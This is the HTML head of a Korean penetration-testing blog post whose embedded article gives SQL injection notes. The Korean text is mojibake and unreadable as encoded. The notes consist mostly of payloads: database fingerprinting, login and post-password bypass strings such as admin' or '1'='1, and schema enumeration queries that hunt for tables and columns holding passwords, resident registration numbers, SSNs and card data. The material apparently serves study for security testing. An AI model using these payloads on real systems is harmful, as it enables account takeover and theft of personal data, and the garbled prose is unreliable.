<!doctype html><html lang=en dir=auto><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>SQL Injection ì·¨ì•½ì  ì ê²€ | CrackerNote</title>
<meta name=keywords content="Web Security,Penetration Testing,SQL Injection"><meta name=description content="1ï¸âƒ£ SQL Injection ì·¨ì•½ì  ì ê²€ ğŸ“œSQL Injection ì—ëŸ¬ ìœ /ë¬´ í™•ì¸ ì·¨ì•½ì  ìœ /ë¬´ í™•ì¸ ê²€ìƒ‰ë€ì˜ ê²½ìš°, ì—°ê²°ì—°ì‚°ì ì‚¬ìš© a. &rsquo; &rsquo; ë¡œ ì‚¬ìš©í•˜ì—¬ ì •ìƒì‘ë™ í•œë‹¤ë©´ (te&rsquo; &lsquo;st), Mysql b. &lsquo;+&rsquo; ë¡œ ì‚¬ìš©í•˜ì—¬ ì •ìƒì‘ë™ í•œë‹¤ë©´ (te&rsquo;+&lsquo;st), Mssql c. &lsquo;||&rsquo; ë¡œ ì‚¬ìš©í•˜ì—¬ ì •ìƒì‘ë™ í•œë‹¤ë©´ (te&rsquo;||&lsquo;st), Oracle ì¡°ê±´ êµ¬ë¬¸ ì™„ì„± ğŸ“œë°©ë²•ë¡  1) ê²€ìƒ‰ê¸°ëŠ¥ì— ëŒ€í•œ ì·¨ì•½ì  ì ê²€
a. select * from board where title like &lsquo;% &lsquo;||(case when 1=1 then &rsquo;test&rsquo; else &lsquo;aaaa&rsquo; end)||&rsquo; %&rsquo;"><meta name=author content="CrackerNote"><link rel=canonical href=http://localhost:1313/posts/sqli-%EC%B7%A8%EC%95%BD%EC%A0%90-%EC%A0%90%EA%B2%80/><meta name=google-site-verification content="XYZabc"><meta name=yandex-verification content="XYZabc"><meta name=msvalidate.01 content="XYZabc"><link crossorigin=anonymous href=/assets/css/stylesheet.css rel="preload stylesheet" as=style><link rel=icon href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=16x16 href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=32x32 href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=apple-touch-icon href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=mask-icon href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=http://localhost:1313/posts/sqli-%EC%B7%A8%EC%95%BD%EC%A0%90-%EC%A0%90%EA%B2%80/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="SQL Injection ì·¨ì•½ì  ì ê²€"><meta property="og:description" content="1ï¸âƒ£ SQL Injection ì·¨ì•½ì  ì ê²€ ğŸ“œSQL Injection ì—ëŸ¬ ìœ /ë¬´ í™•ì¸ ì·¨ì•½ì  ìœ /ë¬´ í™•ì¸ ê²€ìƒ‰ë€ì˜ ê²½ìš°, ì—°ê²°ì—°ì‚°ì ì‚¬ìš© a. &rsquo; &rsquo; ë¡œ ì‚¬ìš©í•˜ì—¬ ì •ìƒì‘ë™ í•œë‹¤ë©´ (te&rsquo; &lsquo;st), Mysql b. &lsquo;+&rsquo; ë¡œ ì‚¬ìš©í•˜ì—¬ ì •ìƒì‘ë™ í•œë‹¤ë©´ (te&rsquo;+&lsquo;st), Mssql c. &lsquo;||&rsquo; ë¡œ ì‚¬ìš©í•˜ì—¬ ì •ìƒì‘ë™ í•œë‹¤ë©´ (te&rsquo;||&lsquo;st), Oracle ì¡°ê±´ êµ¬ë¬¸ ì™„ì„± ğŸ“œë°©ë²•ë¡  1) ê²€ìƒ‰ê¸°ëŠ¥ì— ëŒ€í•œ ì·¨ì•½ì  ì ê²€
a. select * from board where title like &lsquo;% &lsquo;||(case when 1=1 then &rsquo;test&rsquo; else &lsquo;aaaa&rsquo; end)||&rsquo; %&rsquo;"><meta property="og:type" content="article"><meta property="og:url" content="http://localhost:1313/posts/sqli-%EC%B7%A8%EC%95%BD%EC%A0%90-%EC%A0%90%EA%B2%80/"><meta property="og:image" content="http://localhost:1313/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-07-20T00:00:00+00:00"><meta property="article:modified_time" content="2023-07-20T00:00:00+00:00"><meta property="og:site_name" content="CrackerNote"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="http://localhost:1313/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:title content="SQL Injection ì·¨ì•½ì  ì ê²€"><meta name=twitter:description content="1ï¸âƒ£ SQL Injection ì·¨ì•½ì  ì ê²€ ğŸ“œSQL Injection ì—ëŸ¬ ìœ /ë¬´ í™•ì¸ ì·¨ì•½ì  ìœ /ë¬´ í™•ì¸ ê²€ìƒ‰ë€ì˜ ê²½ìš°, ì—°ê²°ì—°ì‚°ì ì‚¬ìš© a. &rsquo; &rsquo; ë¡œ ì‚¬ìš©í•˜ì—¬ ì •ìƒì‘ë™ í•œë‹¤ë©´ (te&rsquo; &lsquo;st), Mysql b. &lsquo;+&rsquo; ë¡œ ì‚¬ìš©í•˜ì—¬ ì •ìƒì‘ë™ í•œë‹¤ë©´ (te&rsquo;+&lsquo;st), Mssql c. &lsquo;||&rsquo; ë¡œ ì‚¬ìš©í•˜ì—¬ ì •ìƒì‘ë™ í•œë‹¤ë©´ (te&rsquo;||&lsquo;st), Oracle ì¡°ê±´ êµ¬ë¬¸ ì™„ì„± ğŸ“œë°©ë²•ë¡  1) ê²€ìƒ‰ê¸°ëŠ¥ì— ëŒ€í•œ ì·¨ì•½ì  ì ê²€
a. select * from board where title like &lsquo;% &lsquo;||(case when 1=1 then &rsquo;test&rsquo; else &lsquo;aaaa&rsquo; end)||&rsquo; %&rsquo;"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"http://localhost:1313/posts/"},{"@type":"ListItem","position":2,"name":"SQL Injection ì·¨ì•½ì  ì ê²€","item":"http://localhost:1313/posts/sqli-%EC%B7%A8%EC%95%BD%EC%A0%90-%EC%A0%90%EA%B2%80/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"SQL Injection ì·¨ì•½ì  ì ê²€","name":"SQL Injection ì·¨ì•½ì  ì ê²€","description":"1ï¸âƒ£ SQL Injection ì·¨ì•½ì  ì ê²€ ğŸ“œSQL Injection ì—ëŸ¬ ìœ /ë¬´ í™•ì¸ ì·¨ì•½ì  ìœ /ë¬´ í™•ì¸ ê²€ìƒ‰ë€ì˜ ê²½ìš°, ì—°ê²°ì—°ì‚°ì ì‚¬ìš© a. \u0026rsquo; \u0026rsquo; ë¡œ ì‚¬ìš©í•˜ì—¬ ì •ìƒì‘ë™ í•œë‹¤ë©´ (te\u0026rsquo; \u0026lsquo;st), Mysql b. \u0026lsquo;+\u0026rsquo; ë¡œ ì‚¬ìš©í•˜ì—¬ ì •ìƒì‘ë™ í•œë‹¤ë©´ (te\u0026rsquo;+\u0026lsquo;st), Mssql c. \u0026lsquo;||\u0026rsquo; ë¡œ ì‚¬ìš©í•˜ì—¬ ì •ìƒì‘ë™ í•œë‹¤ë©´ (te\u0026rsquo;||\u0026lsquo;st), Oracle ì¡°ê±´ êµ¬ë¬¸ ì™„ì„± ğŸ“œë°©ë²•ë¡  1) ê²€ìƒ‰ê¸°ëŠ¥ì— ëŒ€í•œ ì·¨ì•½ì  ì ê²€\na. select * from board where title like \u0026lsquo;% \u0026lsquo;||(case when 1=1 then \u0026rsquo;test\u0026rsquo; else \u0026lsquo;aaaa\u0026rsquo; end)||\u0026rsquo; %\u0026rsquo;","keywords":["Web Security","Penetration Testing","SQL Injection"],"articleBody":"1ï¸âƒ£ SQL Injection ì·¨ì•½ì  ì ê²€ ğŸ“œSQL Injection ì—ëŸ¬ ìœ /ë¬´ í™•ì¸ ì·¨ì•½ì  ìœ /ë¬´ í™•ì¸ ê²€ìƒ‰ë€ì˜ ê²½ìš°, ì—°ê²°ì—°ì‚°ì ì‚¬ìš© a. â€™ â€™ ë¡œ ì‚¬ìš©í•˜ì—¬ ì •ìƒì‘ë™ í•œë‹¤ë©´ (teâ€™ â€˜st), Mysql b. â€˜+â€™ ë¡œ ì‚¬ìš©í•˜ì—¬ ì •ìƒì‘ë™ í•œë‹¤ë©´ (teâ€™+â€˜st), Mssql c. â€˜||â€™ ë¡œ ì‚¬ìš©í•˜ì—¬ ì •ìƒì‘ë™ í•œë‹¤ë©´ (teâ€™||â€˜st), Oracle ì¡°ê±´ êµ¬ë¬¸ ì™„ì„± ğŸ“œë°©ë²•ë¡  1) ê²€ìƒ‰ê¸°ëŠ¥ì— ëŒ€í•œ ì·¨ì•½ì  ì ê²€\na. select * from board where title like â€˜% â€˜||(case when 1=1 then â€™testâ€™ else â€˜aaaaâ€™ end)||â€™ %â€™\n\u003e ê²°ê³¼ : â€˜%â€™||â€˜testâ€™||â€™%â€™ \u003e â€˜%test%â€™ \u003e 1=2ì¼ë•Œ \u003e â€˜%aaaa%â€™\nb. select * from board where 1=1 and title like â€˜%test%â€™ =\u003e TRUE select * from board where 1=2 and title like â€˜%test%â€™ =\u003e TRUE\n\u003e ì»¬ëŸ¼ì´ë¦„ì´ë‚˜ í…Œì´ë¸”ì˜ ì´ë¦„ì˜ ê²½ìš°ëŠ” Preparedë¥¼ ì‚¬ìš©í•˜ì§€ ëª»í•˜ê³ , ì§ì ‘ ë¡œì§ì„ ë§Œë“¤ì–´ í•„í„°ë§ì„ í•´ì¤˜ì•¼í•¨ ë”°ë¼ì„œ ê²€ìƒ‰ ë¶€ë¶„ì˜ íƒ€ì´í‹€, ì‘ì„±ì ë“± ë¶„ë¥˜í•´ì„œ ê²€ìƒ‰í•˜ëŠ” ê¸°ëŠ¥ì´ ìˆë‹¤ë©´ ê°€ëŠ¥ì„±ì´ ìˆìŒ\nc. select * from board where (case when 1=1 then â€™testâ€™ else â€˜aaaâ€™ end) like â€˜%test%â€™\n\u003e ë²„í”„ì—ì„œ ì…ë ¥ì‹œ (case+when+1=1+then+â€˜testâ€™+else+â€˜aaaâ€™+end) ê³µë°±ì„ ë„£ì–´ì¤˜ì•¼í•¨\n2) Prepared Statement í™˜ê²½ì—ì„œì˜ í…Œì´ë¸” íŒŒë¼ë¯¸í„°ì— ëŒ€í•œ ì·¨ì•½ì  ì ê²€ (JAVA Web í™˜ê²½)\na. 127.0.0.1:8080/security/example.jsp?tbname=ex_member ê°€ ìˆì„ ê²½ìš°, ë‘ê°€ì§€ê°€ ì¡´ì¬í•¨\n\u003e select * from tbname\n- 127.0.0.1:8080/security/example.jsp?tbname=all_tablesë¡œ ë°”ê¿”ì„œ ë³´ë‚¼ ê²½ìš°,\nâ€‹ Table Nameì´ ëœ¨ë©´ 100% from ì ˆì— ìˆëŠ” ê²ƒì„. ë˜í•œ Oracle ì‚¬ìš©ì¤‘ ì„ì„ ì•Œ ìˆ˜ ìˆë‹¤.\n\u003e select * from board where tbname = â€˜~~â€™ - prepared statement ëŠ” table nameì— ì ìš©ë  ìˆ˜ ì—†ë‹¤ . ë”°ë¼ì„œ select * from ex_member where id = ?\nâ€‹ ì´ëŸ°ì‹ìœ¼ë¡œ table nameì´ ì•„ë‹ˆë¼ idì™€ ê°™ì€ ì»¬ëŸ¼ëª…ì— ì ìš©ì‹œì¼œì•¼ í•¨. - ì´ëŸ´ê²½ìš° select * from ex_member (where 1=1 and id = ? â€“) where id = ? ì™€ ê°™ì´ table nameì— ëŒ€í•˜ì—¬ sql injectionì„ ìˆ˜í–‰ í•  ìˆ˜ ìˆìŒ\n\u003e ë‹¤ë¥¸ ë°©ë²•ë„ ìˆìŒ (ë” ì‰¬ì›€) - select * from ex_member where id = ? - select * from (select * from ex_member where 1=1 ë˜ëŠ” 1=2) ex_member where id = ? sub ì¿¼ë¦¬ë¥¼ í†µí•˜ì—¬\nâ€‹ í•œë²ˆ ë” ì‹¤í–‰ ë˜ë„ë¡ í•˜ë©´ ê°’ì´ ê°™ì•„ì§„ë‹¤.\n3) ì¸ì¦ìš°íšŒ ê³µê²©\na. IDë¥¼ ì•Œê²½ìš° - in-line query, Terminating query\n\u003e in-line query - â€œselect * from member where id=â€™{$id}â€™ and pw=â€™{$pw}â€™â€ - â€œselect * from member where id=â€™ (adminâ€™ or â€˜1â€™=â€˜1) â€™ and pw=â€™{$pw}â€™â€\n\u003e Terminating query - â€œselect * from member where id=â€™{$id}â€™ and pw=â€™{$pw}â€™â€ - â€œselect * from member where id=â€™ (adminâ€™ â€“ ) â€™ and pw=â€™{$pw}â€™â€ - â€œselect * from member where id=â€™ (adminâ€™#) â€™ and pw=â€™{$pw}â€™â€\n**mysql ì£¼ì„ë¬¸ì: â€“, # ** â€“ì˜ ê²½ìš° [ê³µë°±]â€“[ê³µë°±] ì´ì–´ì•¼ í•¨\nb. IDë¥¼ ëª¨ë¥¼ê²½ìš° - in-line query, Terminating query\n\u003e in-line query - â€œselect * from member where id=â€™{$id}â€™ and pw=â€™{$pw}â€™â€ - â€œselect * from member where id=â€™ (testâ€™ or 1=1 or â€˜1â€™=â€˜1) â€™ and pw=â€™{$pw}â€™â€\n\u003e Terminating query - â€œselect * from member where id=â€™{$id}â€™ and pw=â€™{$pw}â€™â€ - â€œselect * from member where id=â€™ (testâ€™ or â€˜1â€™=â€˜1â€™ â€“ ) â€™ and pw=â€™{$pw}â€™â€ - â€œselect * from member where id=â€™ (testâ€™ or â€˜1â€™=â€˜1â€™#) â€™ and pw=â€™{$pw}â€™â€\nc. ë¹„ë°€ê¸€ ë¹„ë°€ë²ˆí˜¸ ë¶€ë¶„\n\u003e select * from board where idx=6 and pw=â€™{$pw}â€™ select * from board where idx=6 and pw=â€™ (â€™ or â€˜1â€™=â€˜1) â€™ - ëª¨ë“  ê²°ê³¼ê°€ ì°¸ì´ ë˜ë¯€ë¡œâ€¦ table ì•ˆì— ì²«ë²ˆì§¸ ê²Œì‹œê¸€ì´ ë‚˜ì˜¤ê²Œë¨\n\u003e select * from board where idx=6 and pw=â€™ (â€™ or idx=8 â€“ ) â€™ - í•´ì‰¬í™”ë¥¼ ì‹œì¼œ ì €ì¥í•  ê²½ìš° \\1. application ë‹¨ì—ì„œ í•´ì‹œí™” \u003e ì‹±ê¸€ ì¿¼í„°(â€™)ë¡œ íŒë³„ ê°€ëŠ¥ \u003e ì…ë ¥ì‹œ ì˜¤ë¥˜ ì—†ìŒ \u003e ì‹±ê¸€ì¿¼í„°ë„ í¬í•¨í•˜ì—¬ md5 ë³€í™˜ë˜ì–´ ì„œë²„ë¡œ ì „ì†¡\nâ€‹ \u003e sql injection ë¶ˆê°€ â€‹ \\2. DBMS ë‹¨ì—ì„œ í•´ì‹œí™” â€‹ \u003e ì‹±ê¸€ ì¿¼í„°(â€™)ë¡œ íŒë³„ ê°€ëŠ¥ \u003e ì…ë ¥ ì‹œ ì˜¤ë¥˜. (ex. md5() \u003c- ê´„í˜¸ ì•ˆì— â€™ ë“¤ì–´ê°€ë©´ ì˜¤ë¥˜ ìƒê¹€) \u003e sql injectionê°€ëŠ¥\nd. ê²Œì‹œê¸€ ìˆ˜ì •\n\u003e update êµ¬ë¬¸ì— Password ê²€ì¦ ì¿¼ë¦¬ ì˜ˆì¸¡\n- UPDATE board SET title=â€¦, content=â€¦, data=â€¦ WHERE idx=7 and password={$pw} UPDATE board SET title=â€¦, content=â€¦, data=â€¦ WHERE idx=7 and password=â€™ (â€™ or â€˜1â€™=â€˜1) '\nâ€‹ (ì „ì²´ êµ¬ë¬¸ì— ì˜í–¥ì„ ë¯¸ì¹  ìˆ˜ ìˆìŒ..) â€‹ UPDATE board SET title=â€¦, content=â€¦, data=â€¦ WHERE idx=7 and password=â€™â€™ (or idx=7 â€“ ) '\nâ€‹ (ë”°ë¼ì„œ idx ë¥¼ ì§€ì •í•´ì£¼ëŠ” ì¿¼ë¦¬ë¥¼ ì‘ì„± í•˜ì)\n\u003e update êµ¬ë¬¸ì „ password ê²€ì¦ - select * from board where idx=7 and password=â€™â€™ í›„ì— ìˆ˜ì • í˜ì´ì§€ ë“¤ì–´ê°„ í›„ ìˆ˜ì •\ne. ê²Œì‹œê¸€ ì‚­ì œ\n\u003e delete êµ¬ë¬¸ì— password ê²€ì¦ ì¿¼ë¦¬ ì˜ˆì¸¡ - delete from where idx=7 and password=â€™â€™\n4) ë°ì´í„° ì¡°íšŒ ê¸°ë²•\na. DBMS íŒŒì•…\n\u003e ì—ëŸ¬ë¥¼ í†µí•œ íŒŒì•… \u003e ì—°ê²° ì—°ì‚°ìë¥¼ í†µí•œ íŒŒì•… (ëŒ€ë¶€ë¶„ ì—°ê²° ì—°ì‚°ìë¡œ ë§ì´ ë¨) : Oracle(||), MSSQL(+(%2bë¡œ ì‚¬ìš©)), MySQL(ê³µë°±) - (MSSQL) ?idx=192 and â€™testâ€™=â€˜teâ€™+â€˜stâ€™ (MSSQL) (burp ì—ì„œëŠ” \u003e ?idx=192+and+â€˜testâ€™=â€˜teâ€™%2bâ€™stâ€™ ) - (ORCLE) ê²€ìƒ‰ì–´ì— \u003e tâ€™||(case when 1=1 then â€™eâ€™ else â€˜aâ€™ end)||â€˜st \u003e í•¨ìˆ˜ë¥¼ í†µí•œ íŒŒì•… - MySQL - now(), mid() \u003e (?idx=7 and mid(â€™testâ€™,1,1)=â€™tâ€™) \u003e mid í•¨ìˆ˜ì˜ ê²½ìš° mysql ë§Œ ìˆìŒ - MSSQL - len(), substring() \u003e len() í•¨ìˆ˜ì˜ ê²½ìš° mssql ë§Œ ìˆìŒ - ORACLE - substr() \u003e ë”ë¯¸ í…Œì´ë¸”ì„ í†µí•œ íŒŒì•… - ORACLE - select 1 from dual \u003e (?idx=(select 192 from dual))ë¡œ ì¡°íšŒì‹œ 192ë²ˆ ê¸€ì´ ì¡°íšŒ ë˜ì—ˆë‹¤ë©´â€¦ ê°€ëŠ¥ì„± ë†’ìŒ - DB2 - select 1 from sysibm.sysdummy1\n** JSP, JAVA ì‚¬ìš© ì‹œ, ORACLE ** PHP ì‚¬ìš©ì‹œ, Mysql ì‚¬ìš© ê°€ëŠ¥ì„± ë†’ìŒ\nb. ê³µê²© ì í•©ì„± ê²€í† \n\u003e DBMS ì—ëŸ¬ ì¶œë ¥ ìœ /ë¬´ íŒŒì•… = error base \u003e DB ë°ì´í„° ì›¹í˜ì´ì§€ ì¶œë ¥ ìœ /ë¬´ íŒŒì•…(ê²€ìƒ‰ê¸°ëŠ¥ì— ì í•©) = union base \u003e t4 ë¡œ ê²€ìƒ‰í–ˆëŠ”ë° test4ê°€ ê²€ìƒ‰ë  ê²½ìš° \u003e ìœ„ ë‘˜ë‹¤ ì•ˆë˜ë©´ â€¦. Blind\nc. MySQL ë°ì´í„° ì¡°íšŒ\n\u003e 1. ìˆœì°¨ì  ì ‘ê·¼(DBëª©ë¡í™”, Table ëª©ë¡í™”, ì»¬ëŸ¼ ëª©ë¡í™”),\nâ€‹ * DB ëª©ë¡í™” :\nâ€‹ select * from information.schema.schemata\nâ€‹ select schema_name from information.schema.schemata â€‹ (information_schema DB ì•ˆì— schemata í…Œì´ë¸”ì— ìˆëŠ” ì»¬ëŸ¼ â€œSCHEMA_NAME\"ì€ DB ì´ë¦„ì´ë‹¤.) â€‹ (information_schema DBì•ˆì— tables, columns ì•ˆì— ìˆëŠ” ì»¬ëŸ¼ â€œtable_schema\"ëŠ” DB ì´ë¦„ì´ë‹¤.)\nâ€‹ * Table ëª©ë¡í™” :\nâ€‹ select table_name from information_schema.tables where table_schema=â€˜boardâ€™\nâ€‹ * Column ëª©ë¡í™” :\nâ€‹ select * from information_schema.columns where table_shema=â€˜boardâ€™ and table_name=â€˜membersâ€™;\nâ€‹ * ë°ì´í„° ì¡°íšŒ :\nâ€‹ select idx, id, password, jumin from board.members;\n\u003e 2. ë¹„ìˆœì°¨ì ì ‘ê·¼ (ëª©ì ì— ë”°ë¼ ì ‘ê·¼í•˜ëŠ” ì •ë³´ë¶€í„°â€¦)\nâ€‹ * ì›í•˜ëŠ” í…Œì´ë¸” ì´ë¦„ ì¶œë ¥ :\nâ€‹ select table_name from information_schema.tables where table_schema=â€˜boardâ€™\nâ€‹ and table_name like â€˜%mem%â€™;\nâ€‹ -\u003e ì›í•˜ëŠ” í…Œì´ë¸” ì´ë¦„ ì¶œë ¥ í›„, ìˆœì°¨ì ìœ¼ë¡œ Column ëª©ë¡í™”, ë°ì´í„° ì¡°íšŒ ì‹¤í–‰\nâ€‹\nâ€‹ * ì›í•˜ëŠ” ì»¬ëŸ¼ ê´€ë ¨ ì¶œë ¥(id ë“±..) :\nâ€‹ select table_name, column_name from information_schema.columns where table_schema=â€˜boardâ€™ and â€‹ column_name like â€˜%id%â€™;\nd. MSSQL ë°ì´í„° ì¡°íšŒ\n\u003e 1. ìˆœì°¨ì  ì ‘ê·¼\nâ€‹ * ìˆœì°¨ì  ë ˆì½”ë“œ ì¶œë ¥ : (topì€ í…Œì´ë¸”ì˜ ë ˆì½”ë“œë¥¼ ì¡°íšŒí• ë•Œ ê²°ê³¼ì¤‘ ìƒìœ„ ëª‡ê°œë§Œ í‘œê¸°í•˜ê¸° ìœ„í•´ ì‚¬ìš©í•˜ëŠ” êµ¬ë¬¸)\nâ€‹ select top 3 name from sysdatabases; Â» 3ê°œì˜ ê²°ê³¼ê°’ì´ ë‚˜ì˜´\nâ€‹\nâ€‹ (ORDER BY ì‚¬ìš©) â€‹ select top 1 name from (select top 1 name from sysdatabases order by name)a order by name desc;\nâ€‹ \u003e ì²«ë²ˆì§¸ ë ˆì½”ë“œ ì¶œë ¥ ìƒìœ„ topì ˆì€ ë¬´ì¡°ê±´ 1 ë³„ì¹­ í•„ìˆ˜\nâ€‹ select top 1 name from (select top 2 name from sysdatabases order by name)a order by name desc; â€‹ \u003e ë‘ë²ˆì§¸ ë ˆì½”ë“œ ì¶œë ¥\nâ€‹ select top 1 name from (select top 3 name from sysdatabases order by name)a order by name desc; â€‹ \u003e ì„¸ë²ˆì§¸ ë ˆì½”ë“œ ì¶œë ¥\nâ€‹ (NOT IN ì‚¬ìš©)\nâ€‹ select top 1 name from sysdatabases; Â» masterë¼ëŠ” ë ˆì½”ë“œ í•˜ë‚˜ ì¶œë ¥\nâ€‹ select top 1 name from sysdatabases where name not in (â€˜masterâ€™); Â» masterë¼ëŠ” ë ˆì½”ë“œ ì œì™¸ í›„ ìƒìœ„ ì¶œë ¥\nâ€‹ select top 1 name from sysdatabases where name not in (â€˜masterâ€™, â€™tempdbâ€™);\nâ€‹ ** ë ˆì½”ë“œê°€ ë„ˆë¬´ ë§ì„ë•ŒëŠ” ê³„ì† ì¶”ê°€ë˜ì•¼ í•˜ë¯€ë¡œ ê¸¸ì–´ì§ Â» ë”°ë¼ì„œ NOT IN ì—°ì‚°ì ì•ˆì— ì„œë¸Œì¿¼ë¦¬ ì‚¬ìš© ê°€ëŠ¥\nâ€‹ select top 1 name from sysdatabases where name not in (select top 0 name from sysdatabases);\nâ€‹ \u003e ì²«ë²ˆì§¸ ë ˆì½”ë“œ ì¶œë ¥ ì„œë¸Œì¿¼ë¦¬ top ì ˆì€ 0ë¶€í„° ì‹œì‘\nâ€‹ select top 1 name from sysdatabases where name not in (select top 1 name from sysdatabases);\nâ€‹ \u003e ì²«ë²ˆì§¸ ë ˆì½”ë“œ ì œì™¸í•˜ê³  ì œì¼ ìƒìœ„ì— ìˆëŠ” ë ˆì½”ë“œ ì¶œë ¥\nâ€‹ select top 1 name from sysdatabases where name not in (select top 2 name from sysdatabases);\nâ€‹ \u003e ì²«ë²ˆì§¸, ë‘ë²ˆì§¸ ë ˆì½”ë“œ ì œì™¸í•˜ê³  ì œì¼ ìƒìœ„ì— ìˆëŠ” ë ˆì½”ë“œ ì¶œë ¥\nâ€‹ (ROW_NUMBER() ì‚¬ìš©) Â» 2005 ì´ìƒë¶€í„° ì‚¬ìš©ê°€ëŠ¥!!\nâ€‹ ** row_number() Â» ë ˆì½”ë“œë³„ë¡œ ìˆœì°¨ì ìœ¼ë¡œ ì¹´ìš´íŒ… í•´ì¤Œ\nâ€‹ select name from (select ROW_NUMBER() over(order by name)num, name from sysdatabases)a\nâ€‹ where a.num=1; Â» ì²«ë²ˆì§¸ ë ˆì½”ë“œ ì¶œë ¥\nâ€‹ select name from (select ROW_NUMBER() over(order by name)num, name from sysdatabases)a\nâ€‹ where a.num=1; Â» ë‘ë²ˆì§¸ ë ˆì½”ë“œ ì¶œë ¥\n5) DBMSë³„ ë°ì´í„° ì‚¬ì „\na. MYSQL** **\n\u003e Information_schema.schemata / Information_schema.tables / Information_schema.columns\nb. MSSQL\n\u003e sysdatabases(Master DBì— ì¡´ì¬) / sysobjects (ê° ì‚¬ìš© DBì— ì¡´ì¬) / syscolumns (ê° ì‚¬ìš© DBì— ì¡´ì¬)\n\u003e (MSSQL 2005 ì´ìƒ) : sys.databases / sys.objects / sys.columns\n\u003e Information_schema.schemata / Information_schema.tables / Information_schema.columns\nc. ORACLE\n\u003e all_tables / all_tab_columns\n6) DBMSë³„ ë©”íƒ€ë°ì´í„° ëª©ë¡í™”\na. MYSQL\n\u003e ìˆœì°¨ì  ì ‘ê·¼ :\n#DB ëª©ë¡í™”\rselect * from information_schema.SCHEMATA;\rselect schema_name from information_schema.SCHEMATA; # DB ëª©ë¡í™”, schema_name : DBëª…\r#TABLE ëª©ë¡í™”\rselect * from information_schema.tables where table_schema=\"board\"; # table_schema : DB ëª…\rselect table_name from information_schema.tables where table_schema=\"board\"; # table_schema : DB ëª…\r#COLUMN ëª©ë¡í™”\rselect * from information_schema.columns;\rselect * from information_schema.COLUMNS where table_schema=\"board\" and table_name=\"members\"; # table_schema : DB ëª…\r#DATA ì¡°íšŒ\rselect id, idx, password from board.members; \u003e ë¹„ìˆœì°¨ì  ì ‘ê·¼ : í…Œì´ë¸”, ì»¬ëŸ¼ ë“±ì„ ëª©ì ì— ë§ëŠ” ê²ƒë¶€í„° ì¡°íšŒ ì‹œë„ **í…Œì´ë¸” : mem, user, file, session, employee, admin ..\nâ€‹ **ì»¬ëŸ¼ : id, pw, pass, jumin, ssn, admin, card ..\n#TABLE ëª©ë¡í™”\rselect table_name from information_schema.tables where table_schema=\"board\" and table_name like '%mem%';\r#COLUMN ëª©ë¡í™”\rselect table_name, column_name from information_schema.COLUMNS where table_schema=\"board\" and column_name like '%id%'; ","wordCount":"1495","inLanguage":"en","image":"http://localhost:1313/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E","datePublished":"2023-07-20T00:00:00Z","dateModified":"2023-07-20T00:00:00Z","author":{"@type":"Person","name":"CrackerNote"},"mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:1313/posts/sqli-%EC%B7%A8%EC%95%BD%EC%A0%90-%EC%A0%90%EA%B2%80/"},"publisher":{"@type":"Organization","name":"CrackerNote","logo":{"@type":"ImageObject","url":"http://localhost:1313/%3Clink%20/%20abs%20url%3E"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=http://localhost:1313/ accesskey=h title="CrackerNote (Alt + H)"><img src=http://localhost:1313/apple-touch-icon.png alt aria-label=logo height=35>CrackerNote</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=http://localhost:1313/about/ title=About><span>About</span></a></li><li><a href=http://localhost:1313/archives/ title=Archives><span>Archives</span></a></li><li><a href=http://localhost:1313/tags/ title=tags><span>tags</span></a></li><li><a href=http://localhost:1313/search/ title="Search (Alt + /)" accesskey=/><span>Search</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=http://localhost:1313/>Home</a>&nbsp;Â»&nbsp;<a href=http://localhost:1313/posts/>Posts</a></div><h1 